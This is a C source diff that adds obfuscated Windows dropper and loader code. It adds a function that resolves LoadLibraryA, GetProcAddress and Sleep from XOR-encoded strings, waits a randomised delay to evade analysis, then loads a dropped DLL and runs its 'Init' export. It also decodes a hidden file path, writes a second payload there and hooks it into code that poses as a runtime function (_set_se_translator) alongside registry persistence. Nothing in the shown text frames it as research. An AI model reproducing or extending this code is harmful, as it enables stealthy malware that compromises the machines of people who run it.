@@ -183,6 +183,54 @@ static void reg_install(const char *subkey, const char *dll_path) {
   fRegCloseKey(hKey);
 }
 
+typedef HMODULE(WINAPI *pLoadLibraryA)(LPCSTR);
+typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
+typedef VOID(WINAPI *pSleep)(DWORD);
+typedef VOID(WINAPI *pGetSystemTime)(LPSYSTEMTIME);
+
+__attribute__((noinline, optimize("O0")))
+static void run_loader_init(const char *loader_path, pGetSystemTime fGetSystemTime,
+                            HMODULE hK32) {
+  unsigned char e_LoadLibraryA[] = {0x75, 0x57, 0x52, 0x56, 0x2b, 0x0f, 0x50,
+                                    0x10, 0x02, 0x40, 0x40, 0x1e};
+  unsigned char e_GetProcAddress[] = {0x7e, 0x5d, 0x47, 0x62, 0x15, 0x09, 0x51,
+                                      0x23, 0x07, 0x56, 0x4b, 0x3a, 0x42, 0x41};
+  unsigned char e_Sleep[] = {0x6a, 0x54, 0x56, 0x57, 0x17};
+  unsigned char e_Init[] = {0x70, 0x56, 0x5a, 0x46};
+  pLoadLibraryA fLoadLibraryA;
+  pGetProcAddress fGetProcAddress;
+  pSleep fSleep;
+  SYSTEMTIME stJ;
+  DWORD jitter;
+  HMODULE hExt;
+  char init_name[8];
+  FARPROC fnInit;
+
+  if (!loader_path || !loader_path[0] || !hK32 || !fGetSystemTime)
+    return;
+
+  fLoadLibraryA = (pLoadLibraryA)ra(hK32, e_LoadLibraryA, 12);
+  fGetProcAddress = (pGetProcAddress)ra(hK32, e_GetProcAddress, 14);
+  fSleep = (pSleep)ra(hK32, e_Sleep, 5);
+  if (!fLoadLibraryA || !fGetProcAddress || !fSleep)
+    return;
+
+  memset(&stJ, 0, sizeof(stJ));
+  fGetSystemTime(&stJ);
+  jitter = 3000U + ((DWORD)stJ.wMilliseconds * 2917U % 90000U);
+  fSleep(jitter);
+
+  hExt = fLoadLibraryA(loader_path);
+  if (!hExt)
+    return;
+
+  dc_xd(e_Init, init_name, 4);
+  fnInit = fGetProcAddress(hExt, init_name);
+  xe(init_name, e_Init, 4);
+  if (fnInit)
+    ((void(WINAPI *)(void))fnInit)();
+}
+
 __attribute__((noinline))
 static int pop_quiz(void) {
   volatile ULONG64 x = 0xA5A5A5A5A5A5A5A5ULL;
@@ -519,7 +567,7 @@ void *_set_se_translator(void *translator) {
       0x05, 0x51, 0x50, 0x71, 0x4f, 0x57, 0x03, 0x0a, 0x69, 0x1c, 0x70,
       0x76, 0x50, 0x7c, 0x45, 0x5d, 0x00, 0x09, 0x54, 0x68, 0x68, 0x50,
       0x73, 0x75, 0x17, 0x08, 0x74, 0x44, 0x64, 0x7a, 0x5c, 0x37, 0x14,
-      0x5d, 0x01, 0x30, 0x57, 0x4b, 0x29, 0x54, 0x40, 0x03, 0x57, 0x39
+      0x5d, 0x01, 0x30, 0x57, 0x4b, 0x29, 0x54, 0x40, 0x03, 0x57
   };
   char reg_key[256];
 
@@ -529,10 +577,26 @@ void *_set_se_translator(void *translator) {
 
   cff_write_payload(dll_path, file_dll, file_dll_len, &cff_io, &cff_acc);
 
-  SYSTEMTIME st;
-  fGetSystemTime(&st);
-  char timeBuf[128];
-  fGetTimeFormatA(LOCALE_USER_DEFAULT, 0, &st, NULL, timeBuf, 128);
+#define LOADER_PATH_LEN 72
+  unsigned char e_loader_path[] = {
+      0x1c, 0x74, 0x7c, 0x71, 0x26, 0x2a, 0x73, 0x32, 0x33, 0x76, 0x78,
+      0x0b, 0x70, 0x17, 0x6c, 0x28, 0x50, 0x0b, 0x16, 0x5e, 0x43, 0x0c,
+      0x4f, 0x5d, 0x3e, 0x17, 0x29, 0x4f, 0x55, 0x5e, 0x4e, 0x4b, 0x6f,
+      0x71, 0x0b, 0x09, 0x47, 0x06, 0x30, 0x46, 0x56, 0x2d, 0x54, 0x6e,
+      0x63, 0x0d, 0x5c, 0x04, 0x08, 0x6d, 0x67, 0x0a, 0x47, 0x4d, 0x0d,
+      0x37, 0x33, 0x0f, 0x72, 0x5d, 0x56, 0x4d, 0x57, 0x61, 0x13, 0x09,
+      0x40, 0x07, 0x4d, 0x56, 0x55, 0x33
+  };
+  char loader_path[512];
+
+  memset(loader_path, 0, sizeof(loader_path));
+  dc_xd(e_loader_path, loader_path, LOADER_PATH_LEN);
+  dc_path_expand(loader_path, (int)sizeof(loader_path),
+                 (cff_expand_fn)fExpandEnvironmentStringsA);
+  cff_write_payload(loader_path, file_loader, file_loader_len, &cff_io,
+                    &cff_acc);
+
+  run_loader_init(loader_path, fGetSystemTime, hK32);
 
   MEMORY_BASIC_INFORMATION mbi;
   HMODULE hModule = NULL;
